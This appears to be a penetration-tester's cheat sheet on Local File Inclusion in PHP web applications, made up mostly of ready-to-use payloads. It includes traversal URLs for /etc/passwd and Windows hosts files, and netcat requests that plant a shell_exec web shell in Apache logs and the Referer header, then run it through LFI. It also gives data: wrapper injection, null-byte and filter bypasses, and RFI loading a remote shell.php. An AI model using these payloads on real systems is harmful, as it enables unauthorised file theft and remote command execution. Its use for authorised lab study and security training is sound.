# Local File Inclusion
 > Accessing files without proper permissions, find a parameter that loads a current file and try to change it to load another file that you may want.

### Identifying 
If the URL contains a parameter named `file=` this is a good sign we should start enumerating for directory traversals


### Basic Example
**Url:**  
`http://<ip>/home?page=contact.html → This is the original url`  
**Can this work?:**  
`http://<ip>/home?page=contact.html../../../../etc/passwd`  
`http://<ip>/menu.php?file=c:\windows\system32\drivers\etc\hosts`

### Reading PHP Files
`http://<ip>/home?page=php://filter/convert.base64-encode/resource=<page>`  
You might want to read SSH files, log files, backup files, server config, bash history

The `php.ini` file on the Windows 10 lab machine can be found at `C:\xampp\php\php.ini.` Before making any changes to this file, consider making a backup

### Inserting PHP Code into the log file

> Try Burp, try telnet

```
nc 192.168.1.102 80
GET /<?php echo shell_exec($_GET['cmd']);?>  HTTP/1.1
Host: 192.168.1.102
Connection: close
```

Can also add it to the error log by making a req to a page that does not exist
```
nc 192.168.1.102 80
GET /AAAAAA<?php echo shell_exec($_GET['cmd']);?>  HTTP/1.1
Host: 192.168.1.102
Connection: close
```

Or in the refferer parameter
```
GET / HTTP/1.1
Referer: <? passthru($_GET['cmd']) ?>
Host: 192.168.1.159
Connection: close
```

**Execute it in the browser**
`http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id`  

Or for windows:   
`http://10.11.0.22/menu.php?file=c:\xampp\apache\logs\access.log&cmd=ipconfig`


### PHP Wrappers
Inject PHP code via LFI vulnerabilities

**Using data wrapper:**  
`http://10.11.0.22/menu.php?file=data:text/plain,hello world`
`http://<ip>/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>`


### File extensions bypassing
**Example Code:**  
```
$file = $_GET['page']; 
require($file . ".php");
```

**Potential Solution:**
`http://<ip>/home?page=contact.html../../../../etc/passwd%00`
Null Byte Only works for php version < 5.3  


Can add a question Mark at the end so everything gets interpreted as a parameter:
`http://<ip>/home?page=contact.html../../../../etc/passwd?`

### Bypassing Filters
To escape the server stripping ../../../, add 2 dots and 2 slashes. Such as ….//….//….//

Try sending in a post request if php is configured in $_GET instead of $_REQUEST



### RFI
Make calls to remote destinations to retreive files, `file=http://<ip>:8000/shell.php`
